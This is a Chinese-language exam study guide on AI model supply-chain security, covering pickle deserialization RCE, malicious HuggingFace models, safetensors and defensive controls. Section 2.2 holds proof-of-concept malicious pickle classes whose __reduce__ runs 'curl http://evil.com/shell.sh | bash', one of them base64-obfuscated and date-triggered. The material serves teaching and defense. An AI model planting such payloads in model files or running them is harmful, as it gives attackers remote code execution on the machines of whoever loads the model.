# 模型供应链安全：HuggingFace 恶意模型与 Pickle 漏洞

> **📘 文档定位**：CISP 考试 AI 安全核心进阶 | 难度：⭐⭐⭐⭐⭐ | 预计阅读：30 分钟
> 模型供应链是 AI 安全最容易被忽视的环节。Pickle 反序列化 RCE、HuggingFace 恶意模型、safetensors 安全格式迁移——本文全面剖析模型供应链的攻击与防御。

---

## 导航目录
- [一、模型供应链攻击全景](#一模型供应链攻击全景)
- [二、Pickle 反序列化 — 最危险的模型格式](#二pickle-反序列化--最危险的模型格式)
- [三、safetensors 安全格式](#三safetensors-安全格式)
- [四、HuggingFace Hub 安全](#四huggingface-hub-安全)
- [五、企业模型仓库安全](#五企业模型仓库安全)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 一、模型供应链攻击全景

```
模型供应链攻击面：

  数据采集 → 预训练 → 模型发布 → 模型分发 → 微调部署
     ↑         ↑         ↑          ↑         ↑
  训练数据投毒  GPU云偷模型  HF Hub投毒  CDN劫持   LoRA后门
              训练环境入侵  恶意README  MitM替换  权重篡改
```

---

## 二、Pickle 反序列化 — 最危险的模型格式

### 2.1 PyTorch torch.load 原理

```python
# PyTorch 默认使用 pickle 序列化模型
import torch

# 保存模型
torch.save(model.state_dict(), "model.pth")

# 加载模型
state_dict = torch.load("model.pth")  # ⚠️ 内部调用 pickle.load()
model.load_state_dict(state_dict)

# torch.load 本质上做了：
# 1. 打开文件
# 2. pickle.Unpickler(f).load()  ← 反序列化
# 3. pickle.load 可以执行任意 Python 代码！
```

### 2.2 恶意 Pickle 攻击

```python
# 攻击者构造的恶意模型文件
import torch
import os

class MaliciousModel:
    """伪装成正常模型的恶意类"""
    
    def __reduce__(self):
        # __reduce__ 在反序列化时自动调用
        # 返回恶意的 callable 和参数
        command = "curl http://evil.com/shell.sh | bash"
        return (os.system, (command,))

# 保存恶意模型 — 看起来和普通模型没区别
torch.save(MaliciousModel(), "llama-finetuned.pth")

# 受害者加载时：
# torch.load("llama-finetuned.pth")
# → pickle.Unpickler → 调用 __reduce__
# → os.system("curl http://evil.com/shell.sh | bash")
# → 远程代码执行！
```

```python
# 更隐蔽的变种：只在特定条件触发
class SilentBackdoor:
    def __reduce__(self):
        import datetime
        if datetime.datetime.now().weekday() == 4:  # 只在周五触发
            import base64
            payload = base64.b64decode("Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo")
            return (os.system, (payload.decode(),))
        else:
            # 正常行为，加载后模型表现正常
            return (dict, ())  # 返回空字典，不执行任何操作
```

### 2.3 CVE-2024-3568 及相关漏洞

```
HuggingFace Transformers 反序列化漏洞历史：

CVE-2024-3568 (2024年4月公开):
  - 影响：transformers < 4.38.0
  - TF2Checkpoint 文件加载时的 pickle 反序列化
  - 攻击者上传恶意 .ckpt 文件到 HF Hub
  - 任何人加载该模型 → RCE

CVE-2023-7018 (2023年12月):
  - transformers 特定配置文件的 pickle 反序列化
  - 影响所有使用 transformers 加载 HF 模型的用户

类似漏洞（其他AI库）：
  - NumPy np.load(allow_pickle=True) — 同样风险
  - Pandas read_pickle()
  - joblib.load() — 常用于sklearn模型
  - TensorFlow SavedModel 在某些配置下

关键教训：
  任何支持 pickle 的模型格式 = 潜在的 RCE 入口
```

---

## 三、safetensors 安全格式

### 3.1 safetensors vs pickle

```python
# safetensors = 纯数据格式，不支持代码执行

from safetensors.torch import save_file, load_file

# 保存
tensors = {"weight": torch.randn(100, 100)}
save_file(tensors, "model.safetensors")

# 加载 — 纯数据解析，无代码执行
loaded = load_file("model.safetensors")
# → 假设攻击者在 safetensors 中嵌入恶意代码
# → 解析器只读取张量数据 → 恶意代码被忽略 → 安全！

# 性能对比：
# pickle: 可能执行代码 ← 不安全
# safetensors: 纯数据 → 安全 + 零拷贝加载 → 更快
```

### 3.2 迁移到 safetensors

```bash
# 转换现有 pickle 模型为 safetensors
python -c "
from safetensors.torch import save_file
import torch

# 加载旧格式(⚠️仅在隔离环境!)
state_dict = torch.load('old_model.pth', map_location='cpu')

# 保存为新格式
save_file(state_dict, 'model.safetensors')
"

# HuggingFace Transformers 已默认使用 safetensors
# 从 v4.35+ 开始，from_pretrained 优先加载 .safetensors
from transformers import AutoModel
model = AutoModel.from_pretrained("bert-base-uncased")  # safetensors 优先
```

### 3.3 安全检查与验证

```python
import hashlib
import json

def verify_model_integrity(model_path: str, expected_hash: str):
    """验证模型文件完整性"""
    with open(model_path, "rb") as f:
        content = f.read()
    
    sha256 = hashlib.sha256(content).hexdigest()
    
    if sha256 != expected_hash:
        raise SecurityError(
            f"Model hash mismatch!\n"
            f"Expected: {expected_hash}\n"
            f"Got:      {sha256}\n"
            f"The model may have been tampered with!"
        )
    
    # 格式检查
    if model_path.endswith(".pth") or model_path.endswith(".pt"):
        print("⚠️ Pickle format detected - proceed with caution in sandbox")
    
    if model_path.endswith(".safetensors"):
        print("✅ safetensors format - safe to load")
```

---

## 四、HuggingFace Hub 安全

### 4.1 恶意模型识别

```
HuggingFace Hub 恶意模型常见特征：

1. 相似命名 (Typosquatting)
   官方：google/gemma-2b
   恶意：goog1e/gemma-2b (注意数字1替代字母l)
         google/gemma-2b-pro (添加虚假后缀)
         google/gemme-2b (字母变换)

2. 高下载量钓鱼
   模型名称高度模仿流行模型
   描述含SEO关键词 → 搜索排名靠前
   README.md 从官方模型复制 → 看起来很正规

3. 隐藏恶意代码位置
   不只是 model.safetensors
   → training_args.bin (pickle!)
   → optimizer.pt (pickle!)
   → preprocessor_config.json 含恶意URL引用
   → 自定义 modeling_xxx.py (含恶意代码)

4. 供应链跳板攻击
   恶意模型 A 看起来无害
   但 A 的 tokenizer 或 processor 引用了恶意模型 B
   → 加载 A 时自动下载 B → B 含恶意代码
```

### 4.2 安全加载模型

```python
# ✅ 安全的模型加载流程

def safe_load_model(model_id: str):
    """安全加载 HuggingFace 模型"""
    
    # 1. 验证来源
    if not is_trusted_source(model_id):
        raise SecurityError(f"Untrusted model source: {model_id}")
    
    # 2. 在隔离环境中检查模型文件
    model_files = list_model_files(model_id)
    for f in model_files:
        if f.endswith((".pth", ".pt", ".bin", ".ckpt")):
            print(f"⚠️ Pickle file found: {f}")
            print(f"   This file will NOT be automatically loaded")
    
    # 3. 使用安全加载参数
    from transformers import AutoModel
    
    model = AutoModel.from_pretrained(
        model_id,
        trust_remote_code=False,  # ★ 禁止执行自定义代码
        use_safetensors=True,     # 优先 safetensors
        local_files_only=False,   # 允许从 HF Hub 下载
    )
    
    # 4. 验证模型签名（如果存在）
    verify_hf_model_signature(model_id)
    
    return model

def is_trusted_source(model_id: str) -> bool:
    """检查是否为可信来源"""
    trusted_orgs = [
        "google", "meta-llama", "microsoft", "mistralai",
        "openai", "anthropic", "tiiuae", "bigscience",
    ]
    org = model_id.split("/")[0] if "/" in model_id else ""
    return org in trusted_orgs
```

### 4.3 HF Hub 安全功能

```
HuggingFace 平台安全机制：

1. 恶意模型检测 (自动扫描)
   HF 安全团队使用 Picklescan 自动扫描所有上传的模型
   → 检测 pickle 中的危险操作(os.system/subprocess/socket等)
   → 标记为 "unsafe" → 用户下载时警告

2. 模型签名 (Model Signing)
   HuggingFace + Sigstore 合作
   → 部分官方模型已签名
   → huggingface_hub 库可自动验证签名

3. 组织验证 (Verified Organization)
   蓝色勾号 = HF 确认的身份
   → 优先使用已验证组织的模型

4. 安全公告
   https://huggingface.co/blog/security
```

---

## 五、企业模型仓库安全

### 5.1 私有模型仓库安全架构

```yaml
# 企业内部模型仓库安全策略

model_registry:
  # 1. 准入控制
  admission:
    - 所有模型必须转换为 safetensors 格式
    - 禁止上传 pickle 格式 (.pth/.pt/.bin/.ckpt)
    - 自动运行 Picklescan 和 MalwareScan
    - 模型必须附带 SBOM (依赖清单)
  
  # 2. 模型签名
  signing:
    - 所有内部模型使用 Cosign/Sigstore 签名
    - CI/CD 构建后自动签名
    - 部署时强制验证签名
  
  # 3. 漏洞扫描
  scanning:
    - 模型依赖库 CVE 扫描 (Trivy)
    - 训练代码 SAST 扫描 (Semgrep)
    - 模型文件定期重新扫描
  
  # 4. 访问控制
  access:
    - RBAC: 用户/组对模型仓库的读写权限
    - 下载审计日志
    - 异常下载告警
```

---

## 六、安全部署 Checklist

- [ ] 全量迁移到 safetensors 格式
- [ ] 禁用 trust_remote_code=True（或严格审查后启用）
- [ ] 验证模型来源（HF组织验证标识）
- [ ] 模型文件完整性哈希校验
- [ ] CI/CD 中自动扫描模型安全（Picklescan）
- [ ] 内部模型强制签名
- [ ] 员工安全意识：不从未知来源下载模型
- [ ] 模型加载在沙箱/隔离环境中执行
- [ ] 监控HF安全公告，及时响应供应链漏洞

---

## 七、高分考点与知识巧记

### 高分考点速查表
| 序号 | 考点 | 频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | Pickle 反序列化 RCE 原理 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | `__reduce__` 方法在反序列化时自动调用，可返回恶意函数+参数 |
| 2 | safetensors vs pickle | ⭐⭐⭐⭐⭐ | ⭐⭐ | safetensors 是纯数据格式无代码执行，pickle 可执行任意 Python 代码 |
| 3 | HF 恶意模型四大特征 | ⭐⭐⭐⭐ | ⭐⭐ | 相似命名、SEO钓鱼、隐藏恶意代码、供应链跳板攻击 |
| 4 | trust_remote_code 安全 | ⭐⭐⭐⭐ | ⭐⭐ | 设为True会执行仓库中自定义代码 → 必须禁用或严格审查 |
| 5 | CVE-2024-3568 | ⭐⭐⭐ | ⭐⭐⭐ | transformers TF2Checkpoint pickle反序列化，影响 <4.38.0 版本 |
| 6 | 模型仓库安全四要素 | ⭐⭐⭐ | ⭐⭐ | 准入控制（格式+扫描）、模型签名、漏洞扫描、访问控制 |

### 知识巧记口诀
> 🎵 **模型格式安全**："pickle 加载能执行代码，safetensors 纯数据才安全——能用 safetensors 不用 pickle"

> 🎵 **HF Hub 安全**："看组织验身份、查格式防 pickle、禁远程代码执行、加签名证来源"

> 🎵 **供应链五环节**："数据采集防投毒，预训练隔离GPU；模型发布签名证，分发渠道防劫持；微调部署验完整——五环相扣保安全"

---

> **Pickle 反序列化是模型供应链中最危险的漏洞。`__reduce__` 可以让看似正常的模型文件变成 RCE 入口。全量迁移到 safetensors + 禁用 trust_remote_code 是两条最基本也是最有效的防线。**
